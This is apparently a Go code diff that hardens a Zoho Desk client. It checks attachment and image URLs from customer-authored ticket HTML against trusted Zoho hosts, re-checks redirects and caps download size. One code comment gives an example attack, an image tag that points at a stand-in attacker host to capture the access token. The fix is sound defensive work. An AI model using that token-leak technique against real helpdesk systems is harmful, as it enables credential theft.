@@ -6,6 +6,7 @@ import (
 	"fmt"
 	"io"
 	"net/http"
+	"net/url"
 	"os"
 	"path"
 	"path/filepath"
@@ -79,7 +80,10 @@ func truncateValidUTF8(s string, max int) string {
 }
 
 // resolveURL turns a possibly-relative href/src from a Zoho Desk payload
-// into an absolute URL against BaseURL.
+// into an absolute URL against BaseURL. An absolute href is kept as it is
+// and judged by trustedURL before anything is sent to it: these values
+// come out of customer-authored HTML, so the host in one is an input, not
+// a fact.
 func (c *Client) resolveURL(href string) string {
 	if strings.HasPrefix(href, "http://") || strings.HasPrefix(href, "https://") {
 		return href
@@ -88,6 +92,78 @@ func (c *Client) resolveURL(href string) string {
 		href = "/" + href
 	}
 	return c.BaseURL + href
+}
+
+// trustedURL reports whether a credentialed request may be sent to raw.
+// Every request this client makes carries the org id and a live Desk
+// access token, and attachment hrefs and inline <img src> values arrive
+// inside ticket HTML a customer wrote. Without this gate, one <img
+// src="https://attacker.example/x"> in a ticket is a Zoho access token
+// delivered to the attacker — and a 401 from them would have been
+// answered with a freshly minted one.
+//
+// Trusted is: the configured Desk endpoint itself, at the scheme it was
+// configured with; or an https host in the same Zoho data centre, meaning
+// a subdomain of zoho, zohostatic or zohopublic under the TLD baseUrl
+// uses.
+func (c *Client) trustedURL(raw string) bool {
+	u, err := url.Parse(raw)
+	if err != nil || u.Host == "" {
+		return false
+	}
+	base, err := url.Parse(strings.TrimSuffix(c.BaseURL, "/"))
+	if err != nil || base.Host == "" {
+		return false
+	}
+	if sameEndpoint(u, base) {
+		return true
+	}
+	if !strings.EqualFold(u.Scheme, "https") {
+		return false
+	}
+	host := normalizeHost(u)
+	for _, suffix := range zohoSuffixes(normalizeHost(base)) {
+		if strings.HasSuffix(host, suffix) {
+			return true
+		}
+	}
+	return false
+}
+
+// sameEndpoint reports whether two URLs name the same scheme and host.
+func sameEndpoint(a, b *url.URL) bool {
+	return strings.EqualFold(a.Scheme, b.Scheme) && normalizeHost(a) == normalizeHost(b)
+}
+
+// normalizeHost lowercases a URL's host, drops a trailing dot on the name,
+// and drops the port when it is the default for the scheme, so
+// "DESK.Zoho.in.:443" and "desk.zoho.in" compare equal.
+func normalizeHost(u *url.URL) string {
+	host := strings.ToLower(strings.TrimSuffix(u.Hostname(), "."))
+	port := u.Port()
+	switch {
+	case port == "",
+		port == "443" && strings.EqualFold(u.Scheme, "https"),
+		port == "80" && strings.EqualFold(u.Scheme, "http"):
+		return host
+	}
+	return host + ":" + port
+}
+
+// zohoSuffixes returns the host suffixes that belong to the same Zoho data
+// centre as baseHost — ".zoho.in", ".zohostatic.in", ".zohopublic.in" for
+// a desk.zoho.in workspace. A base host that is not a Zoho one (a test
+// server) has no siblings: only itself is trusted.
+func zohoSuffixes(baseHost string) []string {
+	i := strings.Index(baseHost, ".zoho.")
+	if i < 0 {
+		return nil
+	}
+	tld := baseHost[i+len(".zoho."):]
+	if tld == "" {
+		return nil
+	}
+	return []string{".zoho." + tld, ".zohostatic." + tld, ".zohopublic." + tld}
 }
 
 // collectEntryAttachments gathers attachment references from a thread or
@@ -178,6 +254,13 @@ func (c *Client) Attachments(ctx context.Context, id, dir string) ([]ticket.Atta
 		name = sanitizeName(name)
 		filename := fmt.Sprintf("%d-%s", idx, name)
 
+		if !c.trustedURL(r.URL) {
+			// Only the host is reported: the rest of the URL is
+			// attacker-authored and has no business in a log line.
+			warnings = append(warnings, "zoho desk: attachment host not trusted: "+hostOf(r.URL))
+			continue
+		}
+
 		mime, derr := c.downloadAttachment(ctx, r.URL, filepath.Join(dir, filename))
 		if derr != nil {
 			warnings = append(warnings, fmt.Sprintf("zoho desk: download attachment %s: %v", r.ID, derr))
@@ -238,15 +321,54 @@ func (c *Client) WarningsFor(id string) []string {
 	return c.takeWarnings(id)
 }
 
+// hostOf returns a URL's host for a log line, or "" when it does not parse.
+func hostOf(raw string) string {
+	u, err := url.Parse(raw)
+	if err != nil {
+		return ""
+	}
+	return u.Host
+}
+
+const (
+	// maxAttachmentBytes caps one download. Past it the file is refused
+	// rather than written: an attachment nobody can vouch for should not
+	// be able to fill the disk the run is using.
+	maxAttachmentBytes = 64 << 20
+	// maxRedirects is how many hops a download may take. Each one is
+	// re-checked against trustedURL, so a trusted host cannot bounce the
+	// credentialed request onto an untrusted one.
+	maxRedirects = 3
+)
+
+// downloadClient is the HTTP client attachment downloads use: the
+// configured one, with a redirect policy that re-applies the trust gate on
+// every hop and stops after maxRedirects.
+func (c *Client) downloadClient() *http.Client {
+	dl := *c.http()
+	dl.CheckRedirect = func(req *http.Request, via []*http.Request) error {
+		if len(via) >= maxRedirects {
+			return fmt.Errorf("stopped after %d redirects", maxRedirects)
+		}
+		if !c.trustedURL(req.URL.String()) {
+			return fmt.Errorf("redirected to an untrusted host: %s", req.URL.Host)
+		}
+		return nil
+	}
+	return &dl
+}
+
 // downloadAttachment fetches url with the client's auth headers and writes
-// its body to destPath, returning the response's Content-Type.
-func (c *Client) downloadAttachment(ctx context.Context, url, destPath string) (string, error) {
-	req, err := http.NewRequestWithContext(ctx, http.MethodGet, url, nil)
+// its body to destPath, returning the response's Content-Type. The caller
+// has already checked url against trustedURL; every redirect off it is
+// checked again here.
+func (c *Client) downloadAttachment(ctx context.Context, rawURL, destPath string) (string, error) {
+	req, err := http.NewRequestWithContext(ctx, http.MethodGet, rawURL, nil)
 	if err != nil {
 		return "", err
 	}
 
-	resp, err := c.send(ctx, req)
+	resp, err := c.sendWith(ctx, req, c.downloadClient())
 	if err != nil {
 		return "", err
 	}
@@ -262,8 +384,13 @@ func (c *Client) downloadAttachment(ctx context.Context, url, destPath string) (
 	}
 	defer f.Close()
 
-	if _, err := io.Copy(f, resp.Body); err != nil {
+	written, err := io.Copy(f, io.LimitReader(resp.Body, maxAttachmentBytes+1))
+	if err != nil {
 		return "", err
+	}
+	if written > maxAttachmentBytes {
+		os.Remove(destPath)
+		return "", fmt.Errorf("larger than the %d byte limit", int64(maxAttachmentBytes))
 	}
 	return resp.Header.Get("Content-Type"), nil
 }
